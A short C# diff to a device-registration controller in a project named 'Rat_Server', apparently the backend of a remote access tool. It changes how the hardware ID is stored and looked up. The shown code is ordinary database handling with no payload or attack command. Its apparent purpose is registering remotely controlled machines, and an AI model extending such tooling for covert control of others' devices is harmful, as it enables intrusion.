@@ -37,7 +37,7 @@ namespace Rat_Server.Controllers
             }
 
             // Check if the device is already registered
-            if (_context.Devices.Find(new Guid(requestBody.Hwid)) != null)
+            if (_context.Devices.Find(requestBody.Hwid) != null)
             {
                 // Return a 403 error code if it already exists
                 return StatusCode(StatusCodes.Status403Forbidden);
@@ -46,7 +46,7 @@ namespace Rat_Server.Controllers
             // Create a Device object that we'll add to the database
             Device device = new Device
             {
-                Hwid = new Guid(requestBody.Hwid),
+                Hwid = requestBody.Hwid,
                 Name = requestBody.DeviceName,
                 LastActive = DateTime.Now
             };
